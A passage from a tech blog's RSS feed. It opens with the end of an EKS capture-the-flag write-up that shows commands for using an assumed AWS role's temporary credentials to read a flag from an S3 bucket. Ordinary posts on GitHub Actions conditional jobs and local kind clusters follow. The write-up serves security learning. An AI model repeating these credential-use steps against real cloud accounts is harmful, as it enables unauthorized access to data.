<span data-line=""><span style="color: #ADBAC7">        </span><span style="color: #F69D50">"Expiration"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"2023-11-03T05:09:07+00:00"</span></span>
<span data-line=""><span style="color: #ADBAC7">    },</span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #F69D50">"SubjectFromWebIdentityToken"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"system:serviceaccount:challenge5:debug-sa",</span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #F69D50">"AssumedRoleUser"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">{</span></span>
<span data-line=""><span style="color: #ADBAC7">        </span><span style="color: #F69D50">"AssumedRoleId"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"AROA2AVYNEVMZEZ2AFVYI:test",</span></span>
<span data-line=""><span style="color: #ADBAC7">        </span><span style="color: #F69D50">"Arn"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"arn:aws:sts::688655246681:assumed-role/challengeEksS3Role/test"</span></span>
<span data-line=""><span style="color: #ADBAC7">    },</span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #F69D50">"Provider"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"arn:aws:iam::688655246681:oidc-provider/oidc.eks.us-west-1.amazonaws.com/id/C062C207C8F50DE4EC24A372FF60E589",</span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #F69D50">"Audience"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"sts.amazonaws.com"</span></span>
<span data-line=""><span style="color: #ADBAC7">}</span></span></code></pre></div>
<p>Success!  We have some new AWS credentials.  Lets setup our new AWS Session:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">export</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">AWS_ACCESS_KEY_ID="ASIA2AVYNEV&#x3C;*REDACTED*>"</span></span>
<span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">export</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">AWS_SECRET_ACCESS_KEY="VTZ4TuDrtHGca&#x3C;*REDACTED*>"</span></span>
<span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">export</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">AWS_SESSION_TOKEN="IQoJb3JpZ2luX2VjEAQaCXVzLXd+7ONV2wIgESXuf&#x3C;*REDACTED*>"</span></span>
<span data-line=""> </span>
<span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">aws</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">sts</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">get-caller-identity</span></span>
<span data-line=""><span style="color: #ADBAC7">{</span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #F69D50">"UserId"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"AROA2AVYNEVMZEZ2AFVYI:test",</span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #F69D50">"Account"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"688655246681",</span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #F69D50">"Arn"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"arn:aws:sts::688655246681:assumed-role/challengeEksS3Role/test"</span></span>
<span data-line=""><span style="color: #ADBAC7">}</span></span></code></pre></div>
<p>We are now the new role!   We hopefully have access to S3 now.  At the start
of the challenge it provided us a clue to what bucket we want to view by
providing us the IAM policy:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="json" data-theme="default"><code data-language="json" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #ADBAC7">{</span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #8DDB8C">"Policy"</span><span style="color: #ADBAC7">: {</span></span>
<span data-line=""><span style="color: #ADBAC7">        </span><span style="color: #8DDB8C">"Statement"</span><span style="color: #ADBAC7">: [</span></span>
<span data-line=""><span style="color: #ADBAC7">            {</span></span>
<span data-line=""><span style="color: #ADBAC7">                </span><span style="color: #8DDB8C">"Action"</span><span style="color: #ADBAC7">: [</span></span>
<span data-line=""><span style="color: #ADBAC7">                    </span><span style="color: #96D0FF">"s3:GetObject"</span><span style="color: #ADBAC7">,</span></span>
<span data-line=""><span style="color: #ADBAC7">                    </span><span style="color: #96D0FF">"s3:ListBucket"</span></span>
<span data-line=""><span style="color: #ADBAC7">                ],</span></span>
<span data-line=""><span style="color: #ADBAC7">                </span><span style="color: #8DDB8C">"Effect"</span><span style="color: #ADBAC7">: </span><span style="color: #96D0FF">"Allow"</span><span style="color: #ADBAC7">,</span></span>
<span data-line=""><span style="color: #ADBAC7">                </span><span style="color: #8DDB8C">"Resource"</span><span style="color: #ADBAC7">: [</span></span>
<span data-line=""><span style="color: #ADBAC7">                    </span><span style="color: #96D0FF">"arn:aws:s3:::challenge-flag-bucket-3ff1ae2"</span><span style="color: #ADBAC7">,</span></span>
<span data-line=""><span style="color: #ADBAC7">                    </span><span style="color: #96D0FF">"arn:aws:s3:::challenge-flag-bucket-3ff1ae2/flag"</span></span>
<span data-line=""><span style="color: #ADBAC7">                ]</span></span>
<span data-line=""><span style="color: #ADBAC7">            }</span></span>
<span data-line=""><span style="color: #ADBAC7">        ],</span></span>
<span data-line=""><span style="color: #ADBAC7">        </span><span style="color: #8DDB8C">"Version"</span><span style="color: #ADBAC7">: </span><span style="color: #96D0FF">"2012-10-17"</span></span>
<span data-line=""><span style="color: #ADBAC7">    }</span></span>
<span data-line=""><span style="color: #ADBAC7">}</span></span></code></pre></div>
<p>So we want to fetch <code>arn:aws:s3:::challenge-flag-bucket-3ff1ae2/flag</code>:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">aws</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">s3</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">cp</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">s3://challenge-flag-bucket-3ff1ae2/flag</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">.</span></span>
<span data-line=""><span style="color: #F69D50">download:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">s3://challenge-flag-bucket-3ff1ae2/flag</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">to</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">./flag</span><span style="color: #ADBAC7">       </span></span>
<span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">cat</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">flag</span></span>
<span data-line=""><span style="color: #F69D50">wiz_eks_challenge</span><span style="color: #ADBAC7">{w0w_y0u_really_are_4n_eks_and_aws&#x3C;*REDACTED*>}</span></span></code></pre></div>
<p>and thats the final flag! In my next post I'll discuss the remediation steps
to prevent this configuration mistakes on your cluster!</p>]]></description>
            <link>https://sontek.net/blog/2023/eks_cluster_games_ctf</link>
            <guid isPermaLink="true">https://sontek.net/blog/2023/eks_cluster_games_ctf</guid>
            <pubDate>Thu, 02 Nov 2023 00:00:00 GMT</pubDate>
        </item>
        <item>
            <title><![CDATA[Speed up github actions with conditional jobs, even with required checks]]></title>
            <description><![CDATA[<p>Having every github action run on every pull request will end up slowing you
down and sometimes even discourage you from making changes.  For example, if you
see an error in the <code>README.md</code> but you know you'll have to wait for the entire
test suite to run you may choose not to push the change.</p>
<h1>Path Filtering</h1>
<p>To address this problem, Github has a feature called <a href="https://docs.github.com/en/actions/using-workflows/workflow-syntax-for-github-actions#onpushpull_requestpull_request_targetpathspaths-ignore">path filtering</a>
which works really well!  You can include and exclude paths with a simple syntax:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="yaml" data-theme="default"><code data-language="yaml" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #6CB6FF">on</span><span style="color: #ADBAC7">:</span></span>
<span data-line=""><span style="color: #ADBAC7">  </span><span style="color: #8DDB8C">pull_request</span><span style="color: #ADBAC7">:</span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #8DDB8C">paths</span><span style="color: #ADBAC7">:</span></span>
<span data-line=""><span style="color: #ADBAC7">      - </span><span style="color: #96D0FF">'*'</span></span>
<span data-line=""><span style="color: #ADBAC7">      - </span><span style="color: #96D0FF">'*/**'</span></span>
<span data-line=""><span style="color: #ADBAC7">      - </span><span style="color: #96D0FF">'!README.md'</span></span>
<span data-line=""><span style="color: #ADBAC7">      - </span><span style="color: #96D0FF">'!.gitignore'</span></span></code></pre></div>
<p>Which will run on any changes except for <code>README.md</code> and <code>.gitignore</code>.  There is
even a simpler format to this by using <code>paths-ignore</code>:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="yaml" data-theme="default"><code data-language="yaml" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #6CB6FF">on</span><span style="color: #ADBAC7">:</span></span>
<span data-line=""><span style="color: #ADBAC7">  </span><span style="color: #8DDB8C">pull_request</span><span style="color: #ADBAC7">:</span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #8DDB8C">paths-ignore</span><span style="color: #ADBAC7">:</span></span>
<span data-line=""><span style="color: #ADBAC7">      - </span><span style="color: #96D0FF">'README.md'</span></span>
<span data-line=""><span style="color: #ADBAC7">      - </span><span style="color: #96D0FF">'.gitignore'</span></span></code></pre></div>
<p>Although the path filtering feature of github works, I do not recommend using
it because it has some critical issues that I'll talk about below!</p>
<h1>Branch Protection / Required Checks</h1>
<p>Path Filtering has one major flaw which is that it skips the run of the job
completely which means if you are using <a href="https://docs.github.com/en/repositories/configuring-branches-and-merges-in-your-repository/managing-protected-branches/about-protected-branches">branch protection</a>
your PR will be stuck in <code>pending</code> state.</p>
<p>To resolve this we will have to run the job, but skip the actions inside it that
are slow conditionally. There are a few opensource actions out there that make
this easy but the one I recommend is:</p>
<p><a href="https://github.com/tj-actions/changed-files">https://github.com/tj-actions/changed-files</a></p>
<p>It creates a lot of useful outputs you can use in your conditional out of the box
which makes your action easy to write.</p>
<h1>Skipping a required check</h1>
<p>So using <code>tj-actions/changed-files</code> to skip a required check, it will look very
similar to the path filtering from github.  You first define what files you care
about:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="yaml" data-theme="default"><code data-language="yaml" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #8DDB8C">jobs</span><span style="color: #ADBAC7">:</span></span>
<span data-line=""><span style="color: #ADBAC7">  </span><span style="color: #8DDB8C">terraform-lint</span><span style="color: #ADBAC7">: </span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #8DDB8C">runs-on</span><span style="color: #ADBAC7">: </span><span style="color: #96D0FF">ubuntu-22.04</span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #8DDB8C">steps</span><span style="color: #ADBAC7">:</span></span>
<span data-line=""><span style="color: #ADBAC7">      - </span><span style="color: #8DDB8C">uses</span><span style="color: #ADBAC7">: </span><span style="color: #96D0FF">actions/checkout@v3</span></span>
<span data-line=""><span style="color: #ADBAC7">      - </span><span style="color: #8DDB8C">name</span><span style="color: #ADBAC7">: </span><span style="color: #96D0FF">Check if files changed</span></span>
<span data-line=""><span style="color: #ADBAC7">        </span><span style="color: #8DDB8C">id</span><span style="color: #ADBAC7">: </span><span style="color: #96D0FF">changed-files-yaml</span></span>
<span data-line=""><span style="color: #ADBAC7">        </span><span style="color: #8DDB8C">uses</span><span style="color: #ADBAC7">: </span><span style="color: #96D0FF">tj-actions/changed-files@v40</span></span>
<span data-line=""><span style="color: #ADBAC7">        </span><span style="color: #8DDB8C">with</span><span style="color: #ADBAC7">:</span></span>
<span data-line=""><span style="color: #ADBAC7">          </span><span style="color: #8DDB8C">files_yaml</span><span style="color: #ADBAC7">: </span><span style="color: #F47067">|</span></span>
<span data-line=""><span style="color: #96D0FF">            src:</span></span>
<span data-line=""><span style="color: #96D0FF">              - '*'</span></span>
<span data-line=""><span style="color: #96D0FF">              - '*/**'</span></span>
<span data-line=""><span style="color: #96D0FF">              - '!README.md'</span></span>
<span data-line=""><span style="color: #96D0FF">              - '!.gitignore'</span></span></code></pre></div>
<p>The <code>src</code> is just a key selection I made here.  You can have many groups of
files like <code>tests</code>, <code>docs</code>, etc. and conditionally do things if each of them
changed.</p>
<p>So from our example, this step will generate output we can use <code>steps.changed-files-yaml.outputs.src_any_changed</code>
that is either <code>true</code> or <code>false.</code>. To use this we can us the <code>if</code> conditional
block on our jobs.</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="yaml" data-theme="default"><code data-language="yaml" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #8DDB8C">steps</span><span style="color: #ADBAC7">:</span></span>
<span data-line=""><span style="color: #ADBAC7">    - </span><span style="color: #8DDB8C">if</span><span style="color: #ADBAC7">: </span><span style="color: #96D0FF">steps.changed-files-yaml.outputs.src_any_changed == 'true'</span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #8DDB8C">run</span><span style="color: #ADBAC7">: </span><span style="color: #F47067">|</span></span>
<span data-line=""><span style="color: #96D0FF">        earthly \</span></span>
<span data-line=""><span style="color: #96D0FF">        +ci-terraform-lint \</span></span>
<span data-line=""><span style="color: #96D0FF">            --TERRAFORM_VERSION=${{ env.RTX_TERRAFORM_VERSION }}</span></span></code></pre></div>
<p>This will then skip linting if we didn't change any terraform and the job will
be marked successful!</p>
<center>
<img src="/images/posts/github_skip_required_checks/skipped_checks.png">
</center>
<p>This can be confusing sometimes and the people you work with (or future you!)
may wonder why these critical checks are being skipped.   I like to include
a message with the decision that was made so its obvious that we wanted to skip
them:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="yaml" data-theme="default"><code data-language="yaml" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #ADBAC7">- </span><span style="color: #8DDB8C">if</span><span style="color: #ADBAC7">: </span><span style="color: #96D0FF">steps.changed-files-yaml.outputs.src_any_changed == 'false'</span></span>
<span data-line=""><span style="color: #ADBAC7">  </span><span style="color: #8DDB8C">run</span><span style="color: #ADBAC7">: </span><span style="color: #F47067">|</span></span>
<span data-line=""><span style="color: #96D0FF">    echo "No terraform files changed"</span></span></code></pre></div>
<p>Which will output:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="" data-theme="default"><code data-language="" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #adbac7">✅ "No terraform files changed"</span></span></code></pre></div>
<p>Right next to the skipped job which is exactly what we wanted to see! So the end
result would look something like this:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="yaml" data-theme="default"><code data-language="yaml" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #6CB6FF">on</span><span style="color: #ADBAC7">:</span></span>
<span data-line=""><span style="color: #ADBAC7">  </span><span style="color: #8DDB8C">pull_request</span><span style="color: #ADBAC7">:</span></span>
<span data-line=""><span style="color: #ADBAC7">    </span></span>
<span data-line=""><span style="color: #8DDB8C">jobs</span><span style="color: #ADBAC7">:</span></span>
<span data-line=""><span style="color: #ADBAC7">  </span><span style="color: #8DDB8C">terraform-lint</span><span style="color: #ADBAC7">: </span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #8DDB8C">runs-on</span><span style="color: #ADBAC7">: </span><span style="color: #96D0FF">ubuntu-22.04</span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #8DDB8C">steps</span><span style="color: #ADBAC7">:</span></span>
<span data-line=""><span style="color: #ADBAC7">      - </span><span style="color: #8DDB8C">uses</span><span style="color: #ADBAC7">: </span><span style="color: #96D0FF">actions/checkout@v3</span></span>
<span data-line=""><span style="color: #ADBAC7">      - </span><span style="color: #8DDB8C">name</span><span style="color: #ADBAC7">: </span><span style="color: #96D0FF">Check if real files changed</span></span>
<span data-line=""><span style="color: #ADBAC7">        </span><span style="color: #8DDB8C">id</span><span style="color: #ADBAC7">: </span><span style="color: #96D0FF">changed-files-yaml</span></span>
<span data-line=""><span style="color: #ADBAC7">        </span><span style="color: #8DDB8C">uses</span><span style="color: #ADBAC7">: </span><span style="color: #96D0FF">tj-actions/changed-files@v40</span></span>
<span data-line=""><span style="color: #ADBAC7">        </span><span style="color: #8DDB8C">with</span><span style="color: #ADBAC7">:</span></span>
<span data-line=""><span style="color: #ADBAC7">          </span><span style="color: #8DDB8C">files_yaml</span><span style="color: #ADBAC7">: </span><span style="color: #F47067">|</span></span>
<span data-line=""><span style="color: #96D0FF">            src:</span></span>
<span data-line=""><span style="color: #96D0FF">              - '*'</span></span>
<span data-line=""><span style="color: #96D0FF">              - '*/**'</span></span>
<span data-line=""><span style="color: #96D0FF">              - '!README.md'</span></span>
<span data-line=""><span style="color: #96D0FF">              - '!.gitignore'</span></span>
<span data-line=""> </span>
<span data-line=""><span style="color: #ADBAC7">      - </span><span style="color: #8DDB8C">if</span><span style="color: #ADBAC7">: </span><span style="color: #96D0FF">steps.changed-files-yaml.outputs.src_any_changed == 'true'</span></span>
<span data-line=""><span style="color: #ADBAC7">        </span><span style="color: #8DDB8C">run</span><span style="color: #ADBAC7">: </span><span style="color: #F47067">|</span></span>
<span data-line=""><span style="color: #96D0FF">          earthly \</span></span>
<span data-line=""><span style="color: #96D0FF">            +ci-terraform-lint \</span></span>
<span data-line=""><span style="color: #96D0FF">              --TERRAFORM_VERSION=${{ env.RTX_TERRAFORM_VERSION }}</span></span>
<span data-line=""> </span>
<span data-line=""><span style="color: #ADBAC7">      - </span><span style="color: #8DDB8C">if</span><span style="color: #ADBAC7">: </span><span style="color: #96D0FF">steps.changed-files-yaml.outputs.src_any_changed == 'false'</span></span>
<span data-line=""><span style="color: #ADBAC7">        </span><span style="color: #8DDB8C">run</span><span style="color: #ADBAC7">: </span><span style="color: #F47067">|</span></span>
<span data-line=""><span style="color: #96D0FF">          echo "No terraform files changed"</span></span></code></pre></div>
<h1>Conclusion</h1>
<p>Hopefully with this you can start speeding up your github actions and making the
developer experience enjoyable!</p>]]></description>
            <link>https://sontek.net/blog/2023/github_skip_required_checks</link>
            <guid isPermaLink="true">https://sontek.net/blog/2023/github_skip_required_checks</guid>
            <pubDate>Sun, 29 Oct 2023 00:00:00 GMT</pubDate>
        </item>
        <item>
            <title><![CDATA[Running a kubernetes cluster locally with kind]]></title>
            <description><![CDATA[<p>Previously I <a href="/blog/2022/local_kubeadm_cluster">showed</a> how to run kubernetes
locally with <code>kubeadm</code> and VMs but sometimes that is overkill so I wanted to
show how to run <a href="https://kind.sigs.k8s.io/">kind</a> which is "kuberetes in
docker".</p>
<h1>Creating your first cluster</h1>
<p>kind is a very flexible way to run kubernetes locally and allows you to run
single node or multinode clusters while having the flexibility to use all
the features of kubernetes success as ingress.</p>
<p>To create your first cluster it is as simple as running:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">kind</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">create</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">cluster</span><span style="color: #ADBAC7">  </span></span>
<span data-line=""> </span>
<span data-line=""><span style="color: #F69D50">Creating</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">cluster</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"kind"</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">...</span></span>
<span data-line=""><span style="color: #ADBAC7"> </span><span style="color: #F69D50">✓</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">Ensuring</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">node</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">image</span><span style="color: #ADBAC7"> (kindest/node:v1.27.3) 🖼 </span></span>
<span data-line=""><span style="color: #ADBAC7"> </span><span style="color: #F69D50">✓</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">Preparing</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">nodes</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">📦</span><span style="color: #ADBAC7">  </span></span>
<span data-line=""><span style="color: #ADBAC7"> </span><span style="color: #F69D50">✓</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">Writing</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">configuration</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">📜</span><span style="color: #ADBAC7"> </span></span>
<span data-line=""><span style="color: #ADBAC7"> </span><span style="color: #F69D50">✓</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">Starting</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">control-plane</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">🕹️</span><span style="color: #ADBAC7"> </span></span>
<span data-line=""><span style="color: #ADBAC7"> </span><span style="color: #F69D50">✓</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">Installing</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">CNI</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">🔌</span><span style="color: #ADBAC7"> </span></span>
<span data-line=""><span style="color: #ADBAC7"> </span><span style="color: #F69D50">✓</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">Installing</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">StorageClass</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">💾</span><span style="color: #ADBAC7"> </span></span>
<span data-line=""><span style="color: #F69D50">Set</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">kubectl</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">context</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">to</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"kind-kind"</span></span>
<span data-line=""><span style="color: #F69D50">You</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">can</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">now</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">use</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">your</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">cluster</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">with:</span></span>
<span data-line=""> </span>
<span data-line=""><span style="color: #F69D50">kubectl</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">cluster-info</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">--context</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">kind-kind</span></span>
<span data-line=""> </span>
<span data-line=""><span style="color: #F69D50">Have</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">a</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">question,</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">bug,</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">or</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">feature</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">request?</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">Let</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">us</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">know!</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">https://kind.sigs.k8s.io/#community</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">🙂</span></span></code></pre></div>
<p>You now have a functioning kubernetes cluster and you
can view what it created:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">k</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">get</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">node</span></span>
<span data-line=""><span style="color: #F69D50">NAME</span><span style="color: #ADBAC7">                 </span><span style="color: #96D0FF">STATUS</span><span style="color: #ADBAC7">   </span><span style="color: #96D0FF">ROLES</span><span style="color: #ADBAC7">           </span><span style="color: #96D0FF">AGE</span><span style="color: #ADBAC7">     </span><span style="color: #96D0FF">VERSION</span></span>
<span data-line=""><span style="color: #F69D50">kind-control-plane</span><span style="color: #ADBAC7">   </span><span style="color: #96D0FF">Ready</span><span style="color: #ADBAC7">    </span><span style="color: #96D0FF">control-plane</span><span style="color: #ADBAC7">   </span><span style="color: #6CB6FF">4</span><span style="color: #96D0FF">m26s</span><span style="color: #ADBAC7">   </span><span style="color: #96D0FF">v1.27.3</span></span></code></pre></div>
<p>You can also verify that it is running inside docker:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">docker</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">ps</span></span>
<span data-line=""><span style="color: #F69D50">CONTAINER</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">ID</span><span style="color: #ADBAC7">   </span><span style="color: #96D0FF">IMAGE</span><span style="color: #ADBAC7">                  </span><span style="color: #96D0FF">COMMAND</span><span style="color: #ADBAC7">                  </span><span style="color: #96D0FF">CREATED</span><span style="color: #ADBAC7">         </span><span style="color: #96D0FF">STATUS</span><span style="color: #ADBAC7">         </span><span style="color: #96D0FF">PORTS</span><span style="color: #ADBAC7">                       </span><span style="color: #96D0FF">NAMES</span></span>
<span data-line=""><span style="color: #F69D50">1c3ba74dc29b</span><span style="color: #ADBAC7">   </span><span style="color: #96D0FF">kindest/node:v1.27.3</span><span style="color: #ADBAC7">   </span><span style="color: #96D0FF">"/usr/local/bin/entr…"</span><span style="color: #ADBAC7">   </span><span style="color: #6CB6FF">3</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">minutes</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">ago</span><span style="color: #ADBAC7">   </span><span style="color: #96D0FF">Up</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">3</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">minutes</span><span style="color: #ADBAC7">   </span><span style="color: #6CB6FF">127.0</span><span style="color: #96D0FF">.0.1:59327</span><span style="color: #ADBAC7">-</span><span style="color: #F47067">></span><span style="color: #96D0FF">6443/tcp</span><span style="color: #ADBAC7">   </span><span style="color: #96D0FF">kind-control-plane</span></span></code></pre></div>
<h1>Making the cluster useful</h1>
<p>There are a few things you'll notice with the command we ran originally:</p>
<ul>
<li>It grabbed the latest kubernetes version available</li>
<li>It is running a single node cluster</li>
<li>No ingress available</li>
</ul>
<p>Luckily kind makes it really easy to customize your local cluster to be what
you want it to be by using a <code>YAML</code> configuration.</p>
<p>Create the configuration:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="yaml" data-theme="default"><code data-language="yaml" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #8DDB8C">kind</span><span style="color: #ADBAC7">: </span><span style="color: #96D0FF">Cluster</span></span>
<span data-line=""><span style="color: #8DDB8C">apiVersion</span><span style="color: #ADBAC7">: </span><span style="color: #96D0FF">kind.x-k8s.io/v1alpha4</span></span>
<span data-line=""><span style="color: #8DDB8C">nodes</span><span style="color: #ADBAC7">:</span></span>
<span data-line=""><span style="color: #ADBAC7">- </span><span style="color: #8DDB8C">role</span><span style="color: #ADBAC7">: </span><span style="color: #96D0FF">control-plane</span></span>
<span data-line=""><span style="color: #ADBAC7">  </span><span style="color: #8DDB8C">kubeadmConfigPatches</span><span style="color: #ADBAC7">:</span></span>
<span data-line=""><span style="color: #ADBAC7">  - </span><span style="color: #F47067">|</span></span>
<span data-line=""><span style="color: #96D0FF">    kind: InitConfiguration</span></span>
<span data-line=""><span style="color: #96D0FF">    nodeRegistration:</span></span>
<span data-line=""><span style="color: #96D0FF">      kubeletExtraArgs:</span></span>
<span data-line=""><span style="color: #96D0FF">        node-labels: "ingress-ready=true"</span></span>
